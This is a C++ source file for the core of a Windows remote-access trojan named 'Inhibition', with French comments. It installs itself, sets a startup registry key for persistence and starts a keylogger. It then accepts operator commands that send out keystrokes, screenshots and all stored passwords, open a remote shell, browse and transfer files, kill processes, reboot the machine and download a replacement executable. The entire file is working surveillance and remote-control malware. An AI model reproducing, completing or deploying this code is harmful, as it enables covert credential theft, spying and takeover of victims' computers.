#include <common/Convert.hpp>
#include <common/Logger.hpp>
#include <system/System.hpp>
#include <system/Registry.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
#include <blaspheme/Blaspheme.hpp>
#include <blaspheme/transfer/FileTransfer.hpp>
#include <malicious/Keylogger.hpp>
#include "Screenshot.hpp"
#include "CommandDispatcher.hpp"
#include "ProgramStart.hpp"
#include "RemoteControlFunctions.hpp"
#include "InhibitionCoreImpl.hpp"

using namespace Blaspheme;
using namespace System;
using namespace std;

namespace Inhibition
{

    InhibitionCoreImpl::InhibitionCoreImpl()
	{
        initialize();
    }

    InhibitionCoreImpl::~InhibitionCoreImpl()
    {
        clean();
    }

    void InhibitionCoreImpl::initialize()
    {
        // recuperation du chemin d'installation de l'injecteur
		string winpath;
        System::getWindowsPath(winpath);
		installation_path = winpath + "\\" + INHIBITER_EXE_NAME;
        keylog_path = winpath + "\\" + KEYLOG;
        dll_path = winpath + "\\" + INHIBITION_DLL_NAME;
        
        startup = new ProgramStartupKey(installation_path);
        Malicious::Keylogger::instance().setKeylog(keylog_path);
        Malicious::Keylogger::instance().start();
        
        // tous les modules utilisent le meme canal de commande
        ServerAbstractFunction::setSession(session);

        // initialisation des modules
        // on active les modules que le client peut utiliser
        dispatcher.addServerFunction(KILL_CLIENT,           new KillClient);
        dispatcher.addServerFunction(UNINSTALL_CLIENT,      new UninstallClient);
        dispatcher.addServerFunction(GET_LOGFILE,           new SendKeylog);
        dispatcher.addServerFunction(GET_SCREEN,            new SendScreenshot(screenshot));
        dispatcher.addServerFunction(PASSWORDS_GETALL,      new SendPasswords);
        dispatcher.addServerFunction(GET_PROCESSLIST,       new SendProcessList);
        dispatcher.addServerFunction(KILL_PROCESS,          new KillProcess);
        dispatcher.addServerFunction(UPGRADE_CLIENT,        new UpgradeClient);
        dispatcher.addServerFunction(SHUTDOWN,              new Shutdown);
        dispatcher.addServerFunction(REBOOT,                new Reboot);
        dispatcher.addServerFunction(LOGOUT,                new Logout);
        dispatcher.addServerFunction(GET_WINDOWS_VERSION,   new SendWindowsVersion);
        dispatcher.addServerFunction(REBOOT_CLIENT,         new RebootClient);
        dispatcher.addServerFunction(BROWSE_FILES,          new BrowseFileTree);
        dispatcher.addServerFunction(REMOTE_SHELL,          new RemoteShell(cinfo));
        dispatcher.addServerFunction(START_DOWNLOAD,        new StartDownload);
        dispatcher.addServerFunction(START_UPLOAD,          new StartUpload);
        dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName(cinfo));
    }

    void InhibitionCoreImpl::clean()
    {
        delete startup;
        startup = 0;
    }

    bool InhibitionCoreImpl::exit()
    {
        // libération des ressources
        clean();
        
        // cet appel va fermer le le processus injecté et décharger la DLL
        std::exit(0);
        return true;
    }

    bool InhibitionCoreImpl::connect()
    {
		return session.connect(cinfo);
    }

    bool InhibitionCoreImpl::acquire_stream()
    {
		/*
        TcpClient aux;
        LOG << "Tentative de connexion auxiliaire.";
        if(aux.connect(cinfo.ip, cinfo.port))
        {
            if(auth.authentificate(aux))
            {
                LOG << "Envoi de l'ID " + to_string(session.get_id());
                aux.send(to_string(session.get_id())+'\n');
                LOG << "Connexion auxiliaire acquise.";
                session.push_stream(aux);
                return true;
            }
            else
            {
                LOG << "Echec de l'authentification.";
                aux.reset();
            }
        }
        LOG << "Connexion auxiliaire NON acquise.";
		*/
        return false;
    }

    void InhibitionCoreImpl::set_connection_infos(const Blaspheme::ConnectionInfo& info)
    {
        cinfo = info;
		session.setAuthenfication(new StringBasedAuth(cinfo.password));
    }

    const string& InhibitionCoreImpl::getInstallPath()
    {
        return installation_path;
    }

    void InhibitionCoreImpl::disconnect()
    {
        LOG << "Deconnection...";
        // on nettoie a la fois la connexion principale et les connexions auxiliaire
        session.setId(0);
        session.reset();
    }

    bool InhibitionCoreImpl::process_command()
    {
		string buffer_cmd;
        LOG << "En attente d'une commande : ";
        session >> buffer_cmd;
        if(dispatcher.find(buffer_cmd))
        {
            LOG << "Commande recue : " + buffer_cmd;
            dispatcher.dispatch(buffer_cmd);
        }
        else
        {
            LOG << "Commande inconnue : " + buffer_cmd;
            return false;
        }
        return true;
    }

    bool InhibitionCoreImpl::uninstall()
    {
        LOG << "Desinstallation de la cle de registre.";
        startup->uninstall();
        LOG << "Lancement du desinstallateur.";
        Process uninstaller(getInstallPath(), UNINSTALL_CMD);		
        exit();
        return true;
    }

    void InhibitionCoreImpl::upgrade()
    {
        LOG << "Efface l'ancien executable.";
        if(!DeleteFile(getInstallPath().c_str()))
        {
            LOG << "Impossible d'effacer l'executable a mettre a jour.";
            session << FAILURE;
            return;
            
        }
        session << SUCCESS;

        // téléchargement du nouvel executable
        Download download(getInstallPath(), session.stream());
        download.launch();
    }

}
